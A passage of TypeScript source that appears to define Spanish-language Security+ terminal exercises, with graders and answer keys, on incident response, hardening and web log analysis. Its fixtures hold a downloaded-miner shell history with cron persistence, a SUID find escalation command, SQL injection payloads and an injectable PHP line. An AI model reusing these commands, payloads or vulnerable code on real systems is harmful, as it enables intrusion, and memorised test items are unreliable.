/**
 * Terminal PBQs (62-64): the candidate investigates and fixes a simulated Linux server by
 * typing commands. Grading inspects the final server state, so any valid command path counts.
 */
import { EvaluationResult, PartialCreditItem, PBQExplanationData, PBQItem } from '../types/pbq';
import { TerminalQuestion, TerminalState, VNode } from '../terminal/types';
import { fakeHash, isBlocked } from '../terminal/engine';
import { domainNameFor, formatObjective } from './sy0701Objectives';

export interface TerminalPbqDefinition {
  item: PBQItem;
  initial: () => TerminalState;
  questions: TerminalQuestion[];
  /** Shown only when hints are on. */
  hintCommands: string[];
  evaluate: (s: TerminalState) => EvaluationResult;
  guide: PBQExplanationData;
}

// ---------- shared server skeleton ----------

const dir = (owner = 'root', mode = 0o755): VNode => ({ type: 'dir', mode, owner, group: owner });
const file = (content: string, mode = 0o644, owner = 'root', group = owner): VNode => ({ type: 'file', content, mode, owner, group });

function buildFs(files: Record<string, VNode>): Record<string, VNode> {
  const fs: Record<string, VNode> = { '/': dir() };
  for (const d of ['/bin', '/etc', '/home', '/opt', '/root', '/tmp', '/usr', '/usr/bin', '/usr/sbin', '/usr/local', '/usr/local/bin', '/var', '/var/log']) fs[d] = dir();
  fs['/tmp'] = dir('root', 0o1777);
  fs['/root'] = dir('root', 0o700);
  for (const [path, node] of Object.entries(files)) {
    const parts = path.split('/').filter(Boolean);
    for (let i = 1; i < parts.length; i++) {
      const p = '/' + parts.slice(0, i).join('/');
      if (!fs[p]) fs[p] = dir(node.owner);
    }
    fs[path] = node;
  }
  return fs;
}

const PASSWD = `root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sysadmin:x:1000:1000:Sysadmin,,,:/home/sysadmin:/bin/bash
deploy:x:1001:1001:Deploy user,,,:/home/deploy:/bin/bash`;

const welcome = (host: string, text: string) => [
  { kind: 'out' as const, text: `Conectado a ${host} (Ubuntu 22.04 LTS). Sesión de respuesta del SOC.` },
  { kind: 'out' as const, text },
  { kind: 'out' as const, text: 'Escribe "help" para ver los comandos disponibles.' },
];

const base = (host: string, partial: Partial<TerminalState>): TerminalState => ({
  host,
  cwd: '/root',
  fs: {},
  processes: [],
  sockets: [],
  services: {},
  crontabs: {},
  users: { root: { uid: 0, locked: false }, 'www-data': { uid: 33, locked: false }, sysadmin: { uid: 1000, locked: false }, deploy: { uid: 1001, locked: false } },
  firewall: [],
  ufwActive: false,
  lines: [],
  history: [],
  answers: {},
  ...partial,
});

const norm = (v: string | undefined) => (v ?? '').trim().toLowerCase().replace(/\/+$/, '');

function result(breakdown: PartialCreditItem[], perfect: string, tip: string): EvaluationResult {
  const totalScore = Math.round(breakdown.reduce((a, b) => a + b.points, 0));
  return {
    totalScore,
    passed: totalScore >= 75,
    partialCreditBreakdown: breakdown,
    detailedFeedback: totalScore === 100 ? perfect : `Puntuación: ${totalScore}/100. ${tip}`,
    sy0701Objective: '',
    domainName: '',
  };
}

const crit = (id: string, label: string, ok: boolean, max: number, good: string, bad: string): PartialCreditItem => ({
  id,
  label,
  achieved: ok,
  points: ok ? max : 0,
  maxPoints: max,
  explanation: ok ? `Correcto. ${good}` : bad,
});

const item = (
  n: number,
  category: PBQItem['category'],
  title: string,
  objective: [string, string[]],
  minutes: number,
  scenario: string,
  requirements: string[],
  tacticalTip: string
): PBQItem => ({
  id: `pbq-${n}`,
  number: n,
  category,
  categoryTitle: 'Terminal Linux',
  title,
  estimatedMinutes: minutes,
  domain: domainNameFor(objective[0]),
  sy0701Objective: formatObjective(objective[0], objective[1]),
  scenario,
  requirements,
  tacticalTip,
});

// =====================================================================
// PBQ 62 — Compromised web server: incident response from the shell
// =====================================================================
const ATTACKER = '203.0.113.77';

function authLog62(): string {
  const out: string[] = [];
  const t = (m: number, s: number) => `Oct 22 03:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
  out.push(`${t(1, 2)} web01 sshd[2211]: Accepted publickey for sysadmin from 10.0.5.10 port 50211 ssh2`);
  out.push(`${t(1, 40)} web01 sshd[2211]: pam_unix(sshd:session): session closed for user sysadmin`);
  for (let i = 0; i < 6; i++) out.push(`${t(4, 10 + i * 7)} web01 sshd[2300]: Failed password for invalid user oracle from 198.51.100.14 port ${41000 + i} ssh2`);
  const users = ['root', 'admin', 'deploy', 'test', 'ubuntu', 'deploy'];
  for (let i = 0; i < 36; i++) {
    const u = users[i % users.length];
    out.push(`${t(10 + Math.floor(i / 6), (i * 9) % 60)} web01 sshd[${2400 + i}]: Failed password for ${u === 'test' ? 'invalid user test' : u} from ${ATTACKER} port ${50000 + i} ssh2`);
  }
  out.push(`${t(17, 3)} web01 sshd[4099]: Accepted password for deploy from ${ATTACKER} port 50122 ssh2`);
  out.push(`${t(17, 3)} web01 sshd[4099]: pam_unix(sshd:session): session opened for user deploy by (uid=0)`);
  out.push(`${t(18, 41)} web01 sudo:   deploy : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/deploy ; COMMAND=/bin/bash`);
  out.push(`${t(22, 15)} web01 sshd[2470]: Accepted publickey for sysadmin from 10.0.5.10 port 50388 ssh2`);
  return out.join('\n');
}

const PBQ62: TerminalPbqDefinition = {
  item: item(
    62,
    'linux-terminal',
    'Terminal Linux: Respuesta a Incidente en un Servidor Web Comprometido',
    ['4.8', ['4.9', '2.4']],
    10,
    'El SOC recibió una alerta de uso de CPU al 100% en el servidor web01 y conexiones salientes hacia una IP desconocida. Tienes una consola root en el servidor. Investiga con los registros y las herramientas del sistema, identifica cómo entró el atacante y contén el incidente sin interrumpir los servicios legítimos (SSH de administración y el sitio web).',
    [
      'Identifica en los registros de autenticación la IP desde la que se comprometió una cuenta y escríbela abajo.',
      'Bloquea en el firewall del servidor todo el tráfico entrante desde esa IP.',
      'Termina el proceso malicioso que consume la CPU y elimina su ejecutable del disco.',
      'Elimina el mecanismo de persistencia que vuelve a lanzarlo.',
      'Bloquea la cuenta comprometida.',
      'No detengas los servicios legítimos (sshd y nginx).',
    ],
    'Orden de trabajo típico: registros (grep "Accepted" /var/log/auth.log) → procesos (ps aux) → conexiones (ss -tunap) → persistencia (crontab -l -u USUARIO) → contención. Contener no es apagar el servidor: aísla lo malicioso y deja los servicios del negocio funcionando.'
  ),
  initial: () =>
    base('web01', {
      fs: buildFs({
        '/etc/passwd': file(PASSWD),
        '/etc/ssh/sshd_config': file('Port 22\nPermitRootLogin no\nPasswordAuthentication yes\nPubkeyAuthentication yes'),
        '/var/log/auth.log': file(authLog62(), 0o640, 'root', 'adm'),
        '/var/log/syslog': file(
          'Oct 22 03:19:58 web01 CRON[4111]: (deploy) CMD (/tmp/.x/kworkerd --pool 198.51.100.23:4444 >/dev/null 2>&1)\nOct 22 03:20:01 web01 kernel: [ 9921.4] kworkerd[4123]: segfault avoided, threads=8'
        ),
        '/var/www/html/index.html': file('<h1>Tienda</h1>', 0o644, 'www-data'),
        '/home/deploy/.bash_history': file('wget http://198.51.100.23/k.tgz -O /tmp/k.tgz\nmkdir /tmp/.x\ntar xzf /tmp/k.tgz -C /tmp/.x\n(crontab -l; echo "*/5 * * * * /tmp/.x/kworkerd --pool 198.51.100.23:4444") | crontab -\n/tmp/.x/kworkerd --pool 198.51.100.23:4444 &', 0o600, 'deploy'),
        '/tmp/.x/kworkerd': file('ELF-binary:xmrig-fork', 0o755, 'deploy'),
        '/tmp/.x/config.json': file('{"pool":"198.51.100.23:4444","threads":8}', 0o644, 'deploy'),
        '/tmp/k.tgz': file('gzip-archive', 0o644, 'deploy'),
      }),
      processes: [
        { pid: 1, user: 'root', cpu: 0, mem: 0.3, command: '/sbin/init' },
        { pid: 540, user: 'root', cpu: 0, mem: 0.1, command: '/usr/sbin/cron -f' },
        { pid: 612, user: 'root', cpu: 0, mem: 0.4, command: 'sshd: /usr/sbin/sshd -D [listener]' },
        { pid: 820, user: 'root', cpu: 0.1, mem: 0.6, command: 'nginx: master process /usr/sbin/nginx' },
        { pid: 821, user: 'www-data', cpu: 0.4, mem: 1.1, command: 'nginx: worker process' },
        { pid: 4099, user: 'root', cpu: 0, mem: 0.2, command: 'sshd: deploy [priv]' },
        { pid: 4100, user: 'deploy', cpu: 0, mem: 0.1, command: '-bash' },
        { pid: 4123, user: 'deploy', cpu: 98.7, mem: 12.4, command: '/tmp/.x/kworkerd --pool 198.51.100.23:4444' },
      ],
      sockets: [
        { proto: 'tcp', local: '0.0.0.0:22', remote: '0.0.0.0:*', state: 'LISTEN', pid: 612, program: 'sshd' },
        { proto: 'tcp', local: '0.0.0.0:443', remote: '0.0.0.0:*', state: 'LISTEN', pid: 820, program: 'nginx' },
        { proto: 'tcp', local: '10.0.5.20:22', remote: `${ATTACKER}:50122`, state: 'ESTABLISHED', pid: 4099, program: 'sshd' },
        { proto: 'tcp', local: '10.0.5.20:51544', remote: '198.51.100.23:4444', state: 'ESTABLISHED', pid: 4123, program: 'kworkerd' },
      ],
      services: {
        sshd: { description: 'OpenBSD Secure Shell server', active: true, enabled: true, pid: 612 },
        nginx: { description: 'A high performance web server', active: true, enabled: true, pid: 820 },
        cron: { description: 'Regular background program processing daemon', active: true, enabled: true, pid: 540 },
      },
      crontabs: {
        root: ['0 3 * * * /usr/local/bin/backup.sh'],
        deploy: ['*/5 * * * * /tmp/.x/kworkerd --pool 198.51.100.23:4444 >/dev/null 2>&1'],
      },
      lines: welcome('web01', 'Alerta: CPU al 100% desde las 03:20 y conexiones salientes a 198.51.100.23:4444.'),
    }),
  questions: [{ id: 'attacker_ip', label: 'IP desde la que se comprometió la cuenta', placeholder: 'ej. 192.0.2.10' }],
  hintCommands: ['grep "Accepted" /var/log/auth.log', 'ps aux', 'ss -tunap', 'crontab -l -u deploy', 'ufw enable / iptables -A INPUT -s IP -j DROP', 'usermod -L deploy'],
  evaluate: (s) => {
    const malicious = s.processes.some((p) => p.command.includes('kworkerd'));
    const cronClean = !(s.crontabs.deploy ?? []).some((l) => l.includes('kworkerd'));
    const locked = !s.users.deploy || s.users.deploy.locked;
    const removed = !s.fs['/tmp/.x/kworkerd'];
    const servicesUp = ['sshd', 'nginx'].every((n) => s.services[n]?.active) && s.processes.some((p) => p.pid === 612) && s.processes.some((p) => p.pid === 820);
    const ufwPending = s.firewall.some((r) => r.via === 'ufw' && r.source === ATTACKER) && !s.ufwActive;
    return result(
      [
        crit('t62-ip', `IP del atacante: ${ATTACKER}`, norm(s.answers.attacker_ip) === ATTACKER, 20,
          'Tras decenas de "Failed password" desde esa IP aparece "Accepted password for deploy": la fuerza bruta tuvo éxito.',
          `La IP correcta es ${ATTACKER}: es la única con muchos intentos fallidos seguidos de un "Accepted password". 198.51.100.14 solo falló con un usuario inexistente; 10.0.5.10 es el administrador entrando con clave pública. Comando: grep "Accepted" /var/log/auth.log.`),
        crit('t62-block', `Tráfico entrante desde ${ATTACKER} bloqueado`, isBlocked(s, ATTACKER), 15,
          'La IP queda bloqueada en INPUT.',
          ufwPending
            ? 'Agregaste la regla con ufw, pero ufw está inactivo: la regla no se aplica hasta ejecutar "ufw enable".'
            : `Falta una regla que descarte el tráfico de ${ATTACKER}: iptables -A INPUT -s ${ATTACKER} -j DROP (o ufw deny from ${ATTACKER} con ufw activo).`),
        crit('t62-kill', 'Proceso malicioso terminado', !malicious, 20,
          'El minero ya no consume CPU ni mantiene la conexión con el C2.',
          'kworkerd (PID 4123, usuario deploy, 98% de CPU) sigue en ejecución: kill -9 4123 o pkill kworkerd. El nombre imita un hilo del kernel para pasar desapercibido.'),
        crit('t62-cron', 'Persistencia en cron eliminada', cronClean, 15,
          'Sin la tarea cron, el minero no se relanza cada 5 minutos.',
          'El crontab de deploy relanza el minero cada 5 minutos. Revísalo con crontab -l -u deploy y elimínalo con crontab -r -u deploy. Matar el proceso sin quitar la persistencia es un error clásico.'),
        crit('t62-lock', 'Cuenta deploy bloqueada', locked, 15,
          'La cuenta comprometida ya no puede autenticarse.',
          'La contraseña de deploy está en manos del atacante: bloquea la cuenta con usermod -L deploy (o passwd -l deploy) hasta rotar credenciales.'),
        crit('t62-file', 'Ejecutable malicioso eliminado', removed, 10,
          'El binario fue eliminado de /tmp/.x/.',
          'El ejecutable sigue en /tmp/.x/kworkerd (directorio oculto). Elimínalo con rm -rf /tmp/.x (en un caso real, primero copia una muestra y su hash para el análisis forense).'),
        crit('t62-services', 'Servicios legítimos (sshd y nginx) en funcionamiento', servicesUp, 5,
          'La contención no interrumpió el negocio.',
          'Detuviste sshd o nginx. La contención debe aislar lo malicioso sin tirar los servicios del negocio ni la administración remota.'),
      ],
      'Incidente contenido correctamente: acceso inicial identificado, atacante bloqueado, persistencia eliminada y servicios intactos.',
      'Recuerda contener en orden: bloquear al atacante, matar el proceso, quitar la persistencia y bloquear la cuenta.'
    );
  },
  guide: {
    pbqId: 'pbq-62',
    overviewRationale:
      'Una respuesta a incidentes desde la consola sigue el mismo ciclo que cualquier incidente: identificar con evidencia (registros, procesos, conexiones), contener (bloquear al atacante, aislar el proceso), erradicar (persistencia, binarios, credenciales) y dejar el servicio funcionando.',
    keyTakeaways: [
      'Muchos "Failed password" seguidos de un "Accepted" desde la misma IP = fuerza bruta exitosa.',
      'ps aux muestra el consumo de CPU; ss -tunap/netstat -tulpn muestra qué proceso abre cada conexión.',
      'La persistencia más común en Linux: crontab, servicios systemd, ~/.bashrc y claves en ~/.ssh/authorized_keys.',
      'ufw solo aplica reglas cuando está activo (ufw enable). iptables aplica la regla de inmediato.',
      'Bloquear la cuenta (usermod -L) corta el acceso con la contraseña robada sin borrar evidencia.',
    ],
    itemsGlossary: [
      { name: '/var/log/auth.log', badge: '4.9 Fuentes de datos', definition: 'Registro de autenticación de Debian/Ubuntu: logins SSH, sudo y PAM. En RHEL es /var/log/secure.', whyCorrectOrRole: 'grep "Accepted" muestra los accesos exitosos; grep "Failed" los intentos fallidos.', distractorWarning: 'La IP con más fallos no siempre es la que entró: busca la que tiene un "Accepted".', criteria: ['t62-ip'] },
      { name: 'Bloqueo por firewall de host', badge: 'iptables / ufw', definition: 'iptables -A INPUT -s IP -j DROP descarta el tráfico entrante de esa IP. ufw deny from IP hace lo mismo con una interfaz simplificada.', whyCorrectOrRole: 'Corta la sesión del atacante y evita que vuelva a conectarse.', distractorWarning: 'Una regla de ufw no hace nada si ufw está inactivo.', criteria: ['t62-block'] },
      { name: 'Identificar y terminar procesos', badge: 'ps / kill', definition: 'ps aux lista procesos con usuario, PID y uso de CPU/memoria; kill -9 PID termina el proceso de inmediato.', whyCorrectOrRole: 'El minero se identifica por su CPU, su ruta en /tmp y su conexión al pool.', distractorWarning: 'Los nombres que imitan procesos del sistema (kworkerd, [kthreadd]) son una técnica de evasión.', criteria: ['t62-kill'] },
      { name: 'Persistencia con cron', badge: 'crontab', definition: 'crontab -l -u USUARIO lista las tareas programadas; crontab -r -u USUARIO las elimina.', whyCorrectOrRole: 'Sin eliminar la tarea, el malware vuelve cada 5 minutos.', criteria: ['t62-cron'] },
      { name: 'Bloqueo de cuenta', badge: 'usermod -L', definition: 'Bloquea la contraseña de la cuenta (agrega "!" al hash en /etc/shadow).', whyCorrectOrRole: 'La credencial de deploy está comprometida.', distractorWarning: 'usermod -L no bloquea el acceso por clave SSH: en un caso real revisa también ~/.ssh/authorized_keys.', criteria: ['t62-lock'] },
      { name: 'Erradicación del binario', badge: 'rm', definition: 'Eliminar los artefactos del atacante después de preservar una muestra para el análisis.', whyCorrectOrRole: 'El directorio oculto /tmp/.x contiene el minero y su configuración.', criteria: ['t62-file'] },
      { name: 'Contención sin interrumpir el negocio', badge: '4.8 IR', definition: 'Contener es limitar el daño, no apagar todo.', whyCorrectOrRole: 'sshd y nginx son servicios legítimos que deben seguir activos.', criteria: ['t62-services'] },
    ],
  },
};

// =====================================================================
// PBQ 63 — Hardening and integrity audit from the shell
// =====================================================================
const BIN = {
  login: 'ELF-binary:login:util-linux-2.37',
  loginBackdoored: 'ELF-binary:login:util-linux-2.37+pam-bypass',
  sudo: 'ELF-binary:sudo:1.9.9',
  passwd: 'ELF-binary:passwd:4.8.1',
  sshd: 'ELF-binary:sshd:8.9p1',
};

const PBQ63: TerminalPbqDefinition = {
  item: item(
    63,
    'linux-terminal',
    'Terminal Linux: Auditoría de Hardening, SUID e Integridad de Binarios',
    ['2.5', ['4.1', '4.6']],
    9,
    'Antes de pasar el servidor app02 a producción, auditoría exige corregir los hallazgos del último escaneo. La política de la empresa solo autoriza el bit SUID en passwd, sudo y su. Además, el equipo de seguridad guardó en /root/baseline.sha256 los hashes de los binarios críticos tras la instalación: hay que comprobar si alguno fue alterado.',
    [
      'Encuentra los binarios con SUID no autorizados y quítales ese bit (deben seguir siendo ejecutables).',
      'Corrige los permisos de /etc/shadow: nadie fuera de root (y como máximo el grupo shadow, en lectura) debe poder leerlo.',
      'Corrige los permisos de /etc/app/db.conf: contiene credenciales y es modificable por cualquier usuario.',
      'Detén y deshabilita el servicio Telnet.',
      'Compara los binarios críticos con la línea base e indica abajo la ruta del binario alterado.',
    ],
    'find / -perm -4000 -type f lista los binarios SUID. Un binario como find o vim con SUID permite escalar a root (GTFOBins). Para la integridad, calcula sha256sum de cada binario y compáralo con el valor de la línea base.'
  ),
  initial: () => {
    const baseline = [
      ['/bin/login', BIN.login],
      ['/usr/bin/sudo', BIN.sudo],
      ['/usr/bin/passwd', BIN.passwd],
      ['/usr/sbin/sshd', BIN.sshd],
    ]
      .map(([p, c]) => `${fakeHash(c)}  ${p}`)
      .join('\n');
    return base('app02', {
      fs: buildFs({
        '/etc/passwd': file(PASSWD),
        '/etc/shadow': file('root:$6$Xk2...:19650:0:99999:7:::\nsysadmin:$6$Lp9...:19650:0:99999:7:::\ndeploy:$6$Qa1...:19650:0:99999:7:::', 0o644, 'root', 'shadow'),
        '/etc/app/db.conf': file('DB_HOST=10.0.6.15\nDB_USER=app\nDB_PASS=S3cr3t-Pr0d!', 0o666, 'app', 'app'),
        '/root/baseline.sha256': file(baseline, 0o600),
        '/bin/login': file(BIN.loginBackdoored, 0o755),
        '/bin/bash': file('ELF-binary:bash', 0o755),
        '/usr/bin/sudo': file(BIN.sudo, 0o4755),
        '/usr/bin/passwd': file(BIN.passwd, 0o4755),
        '/usr/bin/su': file('ELF-binary:su', 0o4755),
        '/usr/bin/find': file('ELF-binary:find', 0o4755),
        '/usr/bin/vim': file('ELF-binary:vim', 0o755),
        '/usr/sbin/sshd': file(BIN.sshd, 0o755),
        '/usr/local/bin/backup': file('ELF-binary:backup-tool', 0o4755),
      }),
      processes: [
        { pid: 1, user: 'root', cpu: 0, mem: 0.3, command: '/sbin/init' },
        { pid: 612, user: 'root', cpu: 0, mem: 0.4, command: 'sshd: /usr/sbin/sshd -D [listener]' },
        { pid: 700, user: 'root', cpu: 0, mem: 0.1, command: '/usr/sbin/in.telnetd' },
      ],
      sockets: [
        { proto: 'tcp', local: '0.0.0.0:22', remote: '0.0.0.0:*', state: 'LISTEN', pid: 612, program: 'sshd' },
        { proto: 'tcp', local: '0.0.0.0:23', remote: '0.0.0.0:*', state: 'LISTEN', pid: 700, program: 'in.telnetd' },
      ],
      services: {
        sshd: { description: 'OpenBSD Secure Shell server', active: true, enabled: true, pid: 612 },
        telnet: { description: 'Telnet server (inetd)', active: true, enabled: true, pid: 700 },
      },
      users: { root: { uid: 0, locked: false }, sysadmin: { uid: 1000, locked: false }, app: { uid: 1002, locked: false } },
      lines: welcome('app02', 'Auditoría previa a producción. Hallazgos pendientes: SUID, permisos, Telnet e integridad.'),
    });
  },
  questions: [{ id: 'altered', label: 'Ruta del binario alterado', placeholder: 'ej. /usr/bin/ejemplo' }],
  hintCommands: ['find / -perm -4000 -type f', 'chmod u-s ARCHIVO', 'ls -l /etc/shadow', 'chmod 640 /etc/shadow', 'systemctl disable telnet', 'cat /root/baseline.sha256', 'sha256sum /bin/login'],
  evaluate: (s) => {
    const mode = (p: string) => s.fs[p]?.mode ?? -1;
    const noSuidButExec = (p: string) => mode(p) >= 0 && (mode(p) & 0o4000) === 0 && (mode(p) & 0o111) !== 0;
    const legitIntact = ['/usr/bin/sudo', '/usr/bin/passwd', '/usr/bin/su'].every((p) => (mode(p) & 0o4000) !== 0);
    const restricted = (p: string) => mode(p) >= 0 && (mode(p) & 0o007) === 0 && (mode(p) & 0o020) === 0;
    const telnetOff = s.services.telnet && !s.services.telnet.active && !s.services.telnet.enabled;
    return result(
      [
        crit('t63-suid-backup', '/usr/local/bin/backup sin SUID', noSuidButExec('/usr/local/bin/backup'), 12.5,
          'El binario sigue siendo ejecutable pero ya no corre como root.',
          'backup tiene SUID de root sin autorización: chmod u-s /usr/local/bin/backup (o chmod 755). Debe seguir siendo ejecutable.'),
        crit('t63-suid-find', '/usr/bin/find sin SUID', noSuidButExec('/usr/bin/find'), 12.5,
          'find ya no permite escalar privilegios.',
          'find con SUID permite ejecutar comandos como root (find . -exec /bin/sh -p \\;). Quita el bit con chmod u-s /usr/bin/find.'),
        crit('t63-suid-legit', 'SUID autorizados intactos (passwd, sudo, su)', legitIntact, 5,
          'passwd, sudo y su necesitan SUID para funcionar.',
          'Quitaste el SUID a un binario autorizado: passwd, sudo y su lo necesitan (por ejemplo, passwd escribe en /etc/shadow).'),
        crit('t63-shadow', '/etc/shadow sin acceso para otros', restricted('/etc/shadow'), 15,
          'Los hashes de contraseñas ya no son legibles por usuarios comunes.',
          '/etc/shadow era legible por todos (644): cualquiera podía copiar los hashes y crackearlos offline. Usa chmod 640 /etc/shadow (grupo shadow en lectura) o chmod 600.'),
        crit('t63-dbconf', '/etc/app/db.conf protegido', restricted('/etc/app/db.conf'), 15,
          'Las credenciales de la base de datos ya no se pueden leer ni modificar desde otras cuentas.',
          'db.conf tenía permisos 666 (todos leen y escriben la contraseña de la BD). Usa chmod 600 o 640.'),
        crit('t63-telnet', 'Telnet detenido y deshabilitado', !!telnetOff, 20,
          'El servicio en texto claro ya no escucha ni volverá a arrancar con el sistema.',
          'Telnet debe detenerse (systemctl stop telnet) y deshabilitarse (systemctl disable telnet). Solo detenerlo no basta: vuelve a arrancar con el próximo reinicio.'),
        crit('t63-integrity', 'Binario alterado: /bin/login', norm(s.answers.altered) === '/bin/login', 20,
          'Su hash SHA-256 no coincide con la línea base: fue reemplazado (posible puerta trasera en el login).',
          'El binario alterado es /bin/login: es el único cuyo sha256sum no coincide con /root/baseline.sha256. Las fechas o tamaños se pueden falsificar; el hash no.'),
      ],
      'Servidor endurecido: SUID, permisos, servicios e integridad corregidos.',
      'Revisa los permisos con ls -l después de cada chmod y compara cada hash con la línea base.'
    );
  },
  guide: {
    pbqId: 'pbq-63',
    overviewRationale:
      'El hardening de un servidor Linux se verifica desde la consola: qué binarios tienen privilegios especiales, quién puede leer los archivos sensibles, qué servicios están expuestos y si los binarios críticos son los originales.',
    keyTakeaways: [
      'find / -perm -4000 -type f encuentra binarios SUID; -perm -2000 los SGID.',
      'Herramientas como find, vim, less o python con SUID permiten escalar a root (GTFOBins).',
      '/etc/shadow: 640 root:shadow o 600 root:root. Nunca legible por otros.',
      'systemctl stop detiene ahora; systemctl disable evita que arranque con el sistema. Hacen falta ambos.',
      'La integridad se verifica comparando hashes con una línea base confiable (FIM: AIDE, Tripwire).',
    ],
    itemsGlossary: [
      { name: 'SUID no autorizado', badge: '4xxx', definition: 'Un binario con SUID se ejecuta con los privilegios de su dueño (root).', whyCorrectOrRole: 'chmod u-s quita solo ese bit y conserva la ejecución.', distractorWarning: 'chmod 644 también quita el SUID, pero deja el binario sin permiso de ejecución.', criteria: ['t63-suid-backup', 't63-suid-find'] },
      { name: 'SUID legítimos', badge: 'passwd / sudo / su', definition: 'Algunos binarios necesitan SUID para funcionar: passwd modifica /etc/shadow, sudo y su cambian de usuario.', whyCorrectOrRole: 'La política los autoriza explícitamente.', criteria: ['t63-suid-legit'] },
      { name: 'Permisos de archivos sensibles', badge: 'chmod', definition: 'Los archivos con secretos (hashes, contraseñas) no deben ser accesibles para "otros".', whyCorrectOrRole: '640 o 600 para /etc/shadow y la configuración con credenciales.', criteria: ['t63-shadow', 't63-dbconf'] },
      { name: 'Deshabilitar servicios inseguros', badge: 'systemctl', definition: 'stop detiene el servicio en ejecución; disable impide que arranque en el próximo inicio.', whyCorrectOrRole: 'Telnet transmite credenciales en texto claro; se reemplaza por SSH.', criteria: ['t63-telnet'] },
      { name: 'Verificación de integridad (FIM)', badge: 'sha256sum', definition: 'Comparar el hash actual de un archivo con el registrado en una línea base confiable.', whyCorrectOrRole: 'Un hash distinto demuestra que el binario fue modificado.', distractorWarning: 'La fecha de modificación (ls -l) puede falsificarse con touch (timestomping); el hash no.', criteria: ['t63-integrity'] },
    ],
  },
};

// =====================================================================
// PBQ 64 — Web log analysis with pipes, then blocking
// =====================================================================
const BRUTE_IP = '198.51.100.44';
const SQLI_IP = '192.0.2.66';
const BRUTE_FAILS = 38;

function accessLog64(): string {
  const ua = '"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"';
  const at = (h: number, m: number, s: number) => `[22/Oct/2026:${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')} +0000]`;
  const entry = (ip: string, time: string, req: string, status: number, size: number, agent = ua) => `${ip} - - ${time} "${req}" ${status} ${size} "-" ${agent}`;
  const out: string[] = [];
  const normal = ['10.0.5.31', '10.0.5.44', '172.16.8.9', '203.0.113.150', '198.51.100.201'];
  const pages = ['/', '/products.php?id=12', '/products.php?id=7', '/cart.php', '/static/app.css', '/static/logo.png', '/about.html'];
  let minute = 0;
  for (let i = 0; i < 24; i++) out.push(entry(normal[i % normal.length], at(9, minute++ % 60, (i * 13) % 60), `GET ${pages[i % pages.length]} HTTP/1.1`, 200, 1800 + i * 37));
  for (let i = 0; i < BRUTE_FAILS; i++) {
    out.push(entry(BRUTE_IP, at(10, Math.floor(i / 3), (i * 17) % 60), 'POST /admin/login.php HTTP/1.1', 401, 512, '"python-requests/2.31"'));
    if (i % 9 === 4) out.push(entry(normal[i % normal.length], at(10, Math.floor(i / 3), 30), `GET ${pages[(i + 2) % pages.length]} HTTP/1.1`, 200, 2100));
  }
  out.push(entry(BRUTE_IP, at(10, 13, 2), 'POST /admin/login.php HTTP/1.1', 302, 0, '"python-requests/2.31"'));
  out.push(entry(BRUTE_IP, at(10, 13, 3), 'GET /admin/dashboard.php HTTP/1.1', 200, 9811, '"python-requests/2.31"'));
  const sqli = [
    "GET /products.php?id=12' HTTP/1.1",
    "GET /products.php?id=12'%20OR%20'1'='1 HTTP/1.1",
    'GET /products.php?id=12%20ORDER%20BY%205-- HTTP/1.1',
    'GET /products.php?id=-1%20UNION%20SELECT%201,2,3,4-- HTTP/1.1',
    'GET /products.php?id=-1%20UNION%20SELECT%20username,password,3,4%20FROM%20users-- HTTP/1.1',
  ];
  sqli.forEach((req, i) => out.push(entry(SQLI_IP, at(11, 2, i * 11), req, i === 2 ? 500 : 200, 1400 + i * 300, '"sqlmap/1.7.2#stable"')));
  for (let i = 0; i < 6; i++) out.push(entry(normal[(i + 1) % normal.length], at(11, 20 + i, 5), `GET ${pages[(i + 3) % pages.length]} HTTP/1.1`, 200, 2000 + i));
  return out.join('\n');
}

const PBQ64: TerminalPbqDefinition = {
  item: item(
    64,
    'linux-terminal',
    'Terminal Linux: Análisis de Logs Web con Tuberías y Bloqueo de Atacantes',
    ['4.9', ['2.4', '4.5']],
    10,
    'El WAF de la tienda online shop01 estuvo en modo monitoreo durante la mañana y el equipo sospecha de dos ataques: fuerza bruta contra el panel de administración e inyección SQL contra el catálogo. Analiza el log de acceso de nginx desde la consola, responde las preguntas y bloquea a los atacantes en el firewall del servidor sin afectar a los usuarios internos (10.0.5.0/24).',
    [
      'Determina qué IP realizó más peticiones en el log.',
      'Cuenta cuántos intentos de inicio de sesión fallidos (HTTP 401) hizo esa IP.',
      'Identifica la IP que intentó una inyección SQL y el recurso (ruta, sin parámetros) que atacó.',
      'Bloquea el tráfico entrante de ambas IP atacantes.',
      'No bloquees la red interna 10.0.5.0/24.',
    ],
    'Patrón clásico para "IP con más peticiones": awk \'{print $1}\' access.log | sort | uniq -c | sort -nr | head. Para contar: grep IP access.log | grep -c " 401 ". Busca SQLi con grep -i "union\\|select\\|%27" access.log.'
  ),
  initial: () =>
    base('shop01', {
      cwd: '/var/log/nginx',
      ufwActive: true,
      fs: buildFs({
        '/etc/passwd': file(PASSWD),
        '/var/log/nginx/access.log': file(accessLog64(), 0o640, 'www-data', 'adm'),
        '/var/log/nginx/error.log': file(`2026/10/22 11:02:22 [error] 821#821: *417 FastCGI sent in stderr: "PHP Warning: mysqli_query(): You have an error in your SQL syntax" while reading response header from upstream, client: ${SQLI_IP}, request: "GET /products.php?id=12%20ORDER%20BY%205-- HTTP/1.1"`),
        '/var/www/html/products.php': file('<?php $id = $_GET["id"]; $q = "SELECT * FROM products WHERE id=$id"; ?>', 0o644, 'www-data'),
      }),
      processes: [
        { pid: 1, user: 'root', cpu: 0, mem: 0.3, command: '/sbin/init' },
        { pid: 612, user: 'root', cpu: 0, mem: 0.4, command: 'sshd: /usr/sbin/sshd -D [listener]' },
        { pid: 820, user: 'root', cpu: 0.1, mem: 0.6, command: 'nginx: master process /usr/sbin/nginx' },
      ],
      sockets: [
        { proto: 'tcp', local: '0.0.0.0:22', remote: '0.0.0.0:*', state: 'LISTEN', pid: 612, program: 'sshd' },
        { proto: 'tcp', local: '0.0.0.0:443', remote: '0.0.0.0:*', state: 'LISTEN', pid: 820, program: 'nginx' },
      ],
      services: {
        sshd: { description: 'OpenBSD Secure Shell server', active: true, enabled: true, pid: 612 },
        nginx: { description: 'A high performance web server', active: true, enabled: true, pid: 820 },
      },
      lines: welcome('shop01', 'Directorio actual: /var/log/nginx (access.log, error.log). ufw está activo.'),
    }),
  questions: [
